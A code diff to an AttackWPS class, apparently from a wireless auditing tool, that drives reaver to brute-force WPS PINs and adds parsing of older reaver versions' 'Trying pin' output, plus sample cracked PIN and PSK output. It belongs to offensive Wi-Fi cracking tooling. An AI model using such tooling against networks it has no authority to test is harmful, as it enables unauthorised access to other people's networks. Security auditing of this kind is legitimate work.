@@ -181,6 +181,7 @@ class AttackWPS(Attack):
         reaver = Process(command, stdout=stdout_write, stderr=Process.devnull())
 
         self.success = False
+        pins = set()
         pin_current = 0
         pin_total = 11000
         failures = 0
@@ -204,6 +205,8 @@ class AttackWPS(Attack):
             f.write('')
             f.close()
 
+            # CHECK FOR CRACK
+
             (pin, psk, ssid) = AttackWPS.get_pin_psk_ssid(out)
             if pin and psk and ssid:
                 # We cracked it.
@@ -211,15 +214,31 @@ class AttackWPS(Attack):
                 self.crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
                 self.crack_result.dump()
                 break
-            # Look for progress
+
+
+            # PIN PROGRESS
+
+            # Reaver 1.5.*
             match = None
             for match in re.finditer('Pin count advanced: (\d+)\\. Max pin attempts: (\d+)', out):
                 pass
             if match:
+                # Look at last entry for "Pin count advanced" to get latest pin count
                 groups = match.groups()
                 pin_current = int(groups[0])
                 pin_total = int(groups[1])
                 failures = 0
+
+            # Reaver 1.3, 1.4
+            match = None
+            for match in re.finditer('Trying pin (\d+)', out):
+                if match:
+                    pin = int(match.groups()[0])
+                    if pin not in pins:
+                        # Reset failures on successful try
+                        failures = 0
+                        pins.add(pin)
+                        pin_current = len(pins)
 
             # Failures
             failures += out.count('WPS transaction failed')
@@ -263,6 +282,11 @@ class AttackWPS(Attack):
             [!] WARNING: Failed to associate with B2:B2:DC:A1:35:94 (ESSID: CenturyLink2217)
             [+] 0.55% complete. Elapsed time: 0d0h2m21s.
             [+] Estimated Remaining time: 0d15h11m35s
+
+            [+] Pin cracked in 7 seconds
+            [+] WPS PIN: '12345678'
+            [+] WPA PSK: 'abcdefgh'
+            [+] AP SSID: 'Test Router'
             '''
 
         reaver.interrupt()
